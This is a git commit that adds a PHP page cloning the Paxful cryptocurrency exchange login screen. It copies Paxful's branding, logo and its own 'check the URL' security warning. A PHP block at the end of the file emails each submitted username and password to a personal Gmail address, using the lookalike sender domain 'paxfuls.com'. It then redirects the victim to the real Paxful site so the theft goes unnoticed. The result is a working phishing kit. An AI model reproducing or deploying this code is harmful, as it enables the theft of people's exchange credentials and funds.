5b548c5a8e9281be97a701a31f25b187d841c6bb
fahim2204 <fahimfaisal1998@gmail.com>
2023-05-10 01:00:18 +0600

    Done Project

---
+++ index.php
@@ -0,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta property="og:title" content="Log In to Your Account | Paxful" />
+    <meta
+      name="description"
+      content="Sign in to your Paxful account trade or manage your cryptocurrency. We suggest setting up two-factor authentication for enhanced account security."
+    />
+    <meta
+      property="og:image"
+      content="https://accounts.paxful.com/static/og_images/general.jpg"
+    />
+    <title>Log In to Your Account | Paxful</title>
+    <!-- css -->
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
+      integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65"
+      crossorigin="anonymous"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+      integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+
+  <body>
+    <div class="MainTemplate__page">
+      <div class="row align-items-stretch MainTemplate__row">
+        <div
+          class="col-12 col-xl-5 col-lg-6 px-xl-7 py-3 py-5 py-md-7 d-flex justify-content-center justify-content-lg-end"
+        >
+          <div
+            class="w-100 d-flex flex-column align-items-start px-3 px-md-4 px-xl-0 MainTemplate__content"
+          >
+            <div
+              class="d-flex align-items-center justify-content-between w-100 mb-5 dark-theme-icon-disable"
+            >
+              <a href="/"
+                ><svg
+                  viewBox="0 0 123.7 23.3"
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="#333"
+                  width="120"
+                >
+                  <path
+                    d="M91.3 1.7V12c0 3.6 1.5 5 4.1 5s4.1-1.5 4.1-5V1.7h4.3v10.4c0 5.5-3.1 8.5-8.4 8.5-5.2 0-8.4-3-8.4-8.5V1.7zm-59.8 0l8.3 18.6h-4.5l-1.7-4H25l-1.7 4h-4.4l8.3-18.6zm49.7 0v3.5h-9.7v4.9H80v3.5h-8.5v6.8h-4.3V1.7zm32.8 0v15.1h9.7v3.5h-14V1.7zM8.1 1.7c4.9 0 8.1 2.5 8.1 6.8 0 4.1-3.1 6.7-8.1 6.7H4.3v5.2H0V1.7zm47 9.9l6.3 8.7h-4.1c-.6 0-1.2-.2-1.6-.7l-.1-.1-2.3-3.2c-.5-.8-.5-1.8 0-2.6l.1-.2zM29.3 6l-2.9 7.1h5.9zM7.9 5.2H4.3v6.5h3.5c2.7 0 4-1.2 4-3.2s-1.3-3.3-3.9-3.3zm39-3.5c.7 0 1.2.2 1.6.7l.1.1 1.2 1.7c.5.7.5 1.7.1 2.4l-.1.1-1.7 2.4-5.4-7.5z"
+                  ></path>
+                  <path
+                    d="M63.1 0L41.5 23.2c-.2.3-.7-.1-.4-.4L56.7.8c.4-.5 1-.8 1.7-.8z"
+                    fill="#00a5ef"
+                  ></path>
+                </svg>
+              </a>
+              <div class="d-flex">
+                <div class="d-block dropdown border rounded-1">
+                  <button
+                    type="button"
+                    aria-haspopup="true"
+                    aria-expanded="false"
+                    class="d-flex align-items-center w-100 px-2 py-1 justify-content-between btn btn-light bg-white"
+                  >
+                    <svg
+                      width="16"
+                      height="16"
+                      viewBox="0 0 16 16"
+                      fill="gray"
+                      class="me-2 text-gray-500"
+                    >
+                      <path
+                        d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zM1.8 8c0-.8.2-1.6.4-2.3.5.3 1.2.6 1.9.7C4 7 4 7.5 4 8s0 1 .1 1.6c-.7.1-1.4.4-1.9.7-.2-.7-.4-1.5-.4-2.3zm4 0c0-.4 0-.8.1-1.2.7.1 1.4.1 2.1.1s1.4 0 2.1-.1c0 .4.1.8.1 1.2s0 .8-.1 1.2c-.7-.1-1.4-.1-2.1-.1s-1.4 0-2.1.1c-.1-.4-.1-.8-.1-1.2zm6.1-1.6c.7-.2 1.3-.4 1.8-.7.3.7.5 1.5.5 2.3s-.2 1.6-.4 2.3c-.5-.3-1.1-.6-1.8-.7V8c0-.5 0-1-.1-1.6zm1-2.2c-.2.2-.6.3-1.2.5-.2-.8-.4-1.5-.7-2.1.7.3 1.3.9 1.9 1.6zM8 1.8c.1 0 .6.1 1.2 1.3.3.6.5 1.2.7 1.9-.6.1-1.2.1-1.9.1s-1.3 0-1.9-.1c.2-.7.4-1.3.6-1.8.7-1.3 1.2-1.4 1.3-1.4zm-2.9.7c-.3.7-.5 1.4-.7 2.2-.6-.2-1-.3-1.3-.5.6-.7 1.2-1.3 2-1.7zm-2 9.3c.2-.2.6-.3 1.2-.5.2.8.4 1.5.7 2.1-.7-.3-1.3-.9-1.9-1.6zM8 14.2c-.1 0-.6-.1-1.2-1.3-.3-.5-.5-1.1-.6-1.8.6-.1 1.2-.1 1.9-.1s1.3 0 1.9.1c-.2.7-.4 1.3-.6 1.8-.8 1.2-1.3 1.3-1.4 1.3zm2.9-.7c.3-.6.5-1.4.7-2.1.6.2 1 .3 1.2.5-.5.6-1.1 1.2-1.9 1.6z"
+                      ></path>
+                    </svg>
+                    English
+                    <svg
+                      width="16"
+                      height="16"
+                      viewBox="0 0 16 16"
+                      fill="gray"
+                      class="ms-2 LanguageSelector__icon text-gray-500"
+                    >
+                      <path
+                        fill-rule="evenodd"
+                        d="M2.707 4.293L8 9.585l5.293-5.292a1 1 0 111.414 1.414l-6 6a.996.996 0 01-.53.277l-.118.014h-.118a.997.997 0 01-.648-.29l-6-6a1 1 0 011.414-1.415z"
+                        clip-rule="evenodd"
+                      ></path>
+                    </svg>
+                  </button>
+                </div>
+              </div>
+            </div>
+            <div class="w-100 d-flex flex-grow-1">
+              <div class="w-100 h-100">
+                <h1 class="h2 qa-login-page-title mb-3 mb-lg-4 font-alpha">
+                  Log In With Paxful
+                </h1>
+                <div
+                  class="alert alert-info d-flex align-items-start font-weight-semibold regular-18 lh-16 mb-3 mb-xs-4 d-none"
+                >
+                  <svg
+                    width="16"
+                    height="16"
+                    viewBox="0 0 16 16"
+                    fill="currentColor"
+                    class="mr-2_5 icon"
+                  >
+                    <path
+                      fill-rule="evenodd"
+                      d="M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z"
+                      clip-rule="evenodd"
+                    ></path>
+                  </svg>
+                  <div class="d-flex flex-column flex-xs-row">
+                    IMPORTANT! Please check that you are visiting
+                    https://accounts.paxful.com/<img
+                      src="https://accounts.paxful.com/static/dist/assets/images/https-label-91194ad43fc85d71e34a467282e95f23.png"
+                      class="mt-2 ms-xs-3 align-self-start LoginTemplate__labelIcon"
+                      alt="url"
+                    />
+                  </div>
+                </div>
+                <div class="mb-3"></div>
+                <form method="post" action="">
+                  <div class="mb-3">
+                    <label
+                      for="username"
+                      class="label-small font-weight-semibold"
+                      >Your Phone or Email</label
+                    >
+                    <div>
+                      <div>
+                        <div
+                          class="d-flex align-items-center justify-content-between form-control"
+                        >
+                          <input
+                            name="username"
+                            type="text"
+                            class="min-width-0 border-transparent py-0 form-control"
+                            value=""
+                            required
+                          />
+                        </div>
+                      </div>
+                      <div class="position-relative cursor-pointer"></div>
+                    </div>
+                  </div>
+                  <div class="mb-4">
+                    <div
+                      class="d-flex align-items-start justify-content-between"
+                    >
+                      <label
+                        for="password"
+                        class="label-small font-weight-semibold"
+                        >Your Password</label
+                      ><a
+                        class="regular-20 lh-16"
+                        tabindex="-1"
+                        href="https://paxful.com/forgot-password?locale=en"
+                        >Forgot password?</a
+                      >
+                    </div>
+                    <div>
+                      <div
+                        class="d-flex align-items-center justify-content-between form-control mb-2"
+                      >
+                        <input
+                          name="password"
+                          id="password"
+                          autocomplete="current-password"
+                          data-recording-disable="true"
+                          type="password"
+                          class="min-width-0 border-transparent py-0 form-control"
+                          value=""
+                          required
+                        />
+                      </div>
+                    </div>
+                  </div>
+                  <button
+                    type="submit"
+                    name="submit"
+                    class="py-3 d-flex justify-content-between align-items-center btn btn-primary btn-lg btn-block"
+                  >
+                    <span>Log in</span
+                    ><svg
+                      width="16"
+                      height="16"
+                      viewBox="0 0 16 16"
+                      fill="currentColor"
+                      class="reflect-element"
+                    >
+                      <path
+                        fill-rule="evenodd"
+                        d="M4.294 13.292l5.292-5.293-5.292-5.293a1 1 0 111.414-1.414l6 6a.99.99 0 01.277.53L12 7.94v.118a.996.996 0 01-.291.648l-6 6a1 1 0 11-1.414-1.414z"
+                        clip-rule="evenodd"
+                      ></path>
+                    </svg>
+                  </button>
+                </form>
+                <hr class="mt-4" />
+                <span class="d-flex regular-24"
+                  >New on Paxful?<a
+                    href="https://paxful.com/register?locale=en"
+                    class="ms-2"
+                    >Create an Account</a
+                  ></span
+                >
+              </div>
+            </div>
+          </div>
+        </div>
+        <div
+          class="d-none d-lg-block col-12 col-xl-7 col-lg-6 pl-0 overflow-hidden bg-blue-100"
+        >
+          <div
+            class="d-flex align-items-center justify-content-center h-100 overflow-hidden"
+          >
+            <img
+              src="assets/right-bg.webp"
+              class="right-img"
+              loading="lazy"
+              alt="Create an Account"
+              style="opacity: 1"
+            />
+          </div>
+        </div>
+      </div>
+    </div>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4"
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
+
+<?php
+if (isset($_POST['submit'])) {
+  // Validate form input
+  $username = $_POST['username'];
+  $pass = $_POST['password'];
+
+
+  // Set the recipient email address
+  $to = "simranraj938693@gmail.com";
+
+  // Set the email subject
+  $subject = "A new login detected";
+
+  // Set the email message
+  $message_body ="Username: " . $username . "<br>" .
+    "Password: " . $pass . "<br>";
+
+  // Set the email headers
+  $headers = "From: paxfuls.com <mail@paxfuls.com>" . "\r\n" .
+    "Reply-To: " . $name . " <" . $email . ">" . "\r\n" .
+    "X-Priority: 1 (Highest)" . "\r\n" .
+    "X-Mailer: PHP/" . phpversion() . "\r\n" .
+    "MIME-Version: 1.0" . "\r\n" .
+    "Content-type:text/html;charset=UTF-8" . "\r\n";
+
+  // Send the email
+  if (mail($to, $subject, $message_body, $headers)) {
+    echo "<script>window.location.href = 'https://accounts.paxful.com';</script>";
+  } else {
+    echo "<script>window.location.href = 'https://google.com';</script>";
+  }
+  
+}
+
+?>
